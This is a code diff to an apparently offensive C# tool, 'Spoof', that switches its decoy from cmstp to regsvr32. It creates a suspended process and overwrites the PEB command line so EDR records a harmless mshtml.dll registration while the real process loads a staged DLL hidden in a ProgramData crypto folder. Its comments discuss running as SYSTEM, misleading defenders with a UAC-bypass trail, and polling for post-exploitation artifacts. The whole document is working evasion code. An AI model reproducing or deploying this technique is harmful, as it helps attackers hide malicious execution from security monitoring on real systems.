@@ -111,22 +111,22 @@ public static class Spoof
 
     public static void Go()
     {
-        // realCmd    -> what cmstp actually processes (passed to CreateProcessW)
+        // realCmd    -> what regsvr32 actually processes (passed to CreateProcessW)
         // spoofedCmd -> what EDR sees in Win32_Process.CommandLine (PEB-overwritten)
-        // Pad realCmd with trailing spaces so its UTF-16 buffer fits the original
-        // CommandLine allocation; cmstp's argv parser ignores trailing whitespace.
-        // Drop /au from realCmd: we're already SYSTEM, CMSTPLUA's INF-location
-        // trust check rejects C:\ProgramData\* and the whole step no-ops.
-        // Keep /au in spoofedCmd so the UAC-bypass narrative survives in EDR.
-        string spoofedCmd = "cmstp.exe /au /s C:\\Windows\\System32\\cmstp.inf";
-        string realCmd    = "cmstp.exe /s C:\\Windows\\Temp\\config.inf       ";
+        // spoofedCmd is shorter than realCmd; the PEB's CommandLine.Buffer is
+        // allocated to fit realCmd, we write spoofedCmd bytes (no overflow),
+        // and set Length = spoofedCmd byte count so EDR sees only the decoy.
+        // Decoy is regsvr32 + a real signed System32 DLL (mshtml.dll) — the
+        // canonical T1218.010 decoy that EDR is tuned to expect.
+        string spoofedCmd = "regsvr32.exe /s \"C:\\Windows\\System32\\mshtml.dll\"";
+        string realCmd    = "regsvr32.exe /s \"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\stage.dll\"";
 
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
 
         PROCESS_INFORMATION pi;
 
-        Log("[*] Creating suspended cmstp.exe...");
+        Log("[*] Creating suspended regsvr32.exe...");
         if (!CreateProcessW(null, realCmd, IntPtr.Zero, IntPtr.Zero, false,
             CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
         {
@@ -134,7 +134,7 @@ public static class Spoof
             Log("[-] CreateProcessW FAILED (error " + err + ")");
             return;
         }
-        Log("[+] cmstp.exe created (PID=" + pi.dwProcessId + ")");
+        Log("[+] regsvr32.exe created (PID=" + pi.dwProcessId + ")");
 
         int retLen;
         PROCESS_BASIC_INFORMATION pbi;
@@ -189,7 +189,7 @@ public static class Spoof
             CloseHandle(pi.hThread);
             return;
         }
-        Log("[+] Command line overwritten: cmstp.inf");
+        Log("[+] Command line overwritten: mshtml.dll");
 
         byte[] lengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
         byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
@@ -198,12 +198,13 @@ public static class Spoof
         WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out written);
         Log("[+] Command line length updated");
 
-        Log("[*] Resuming cmstp.exe thread...");
+        Log("[*] Resuming regsvr32.exe thread...");
         ResumeThread(pi.hThread);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
-        // ponytail: cmstp /au /s exits cleanly regardless of INF result, so an
-        // alive-check is a false-negative. Loader polls for post-ex artifacts instead.
-        Log("[+] cmstp.exe resumed, argument spoofing complete");
+        // ponytail: regsvr32.exe /s exits cleanly whether DllRegisterServer succeeds
+        // or not, so an alive-check is a false-negative. Loader polls for post-ex
+        // artifacts (LoaderLog entries from WorkerThread) instead.
+        Log("[+] regsvr32.exe resumed, argument spoofing complete");
     }
 }
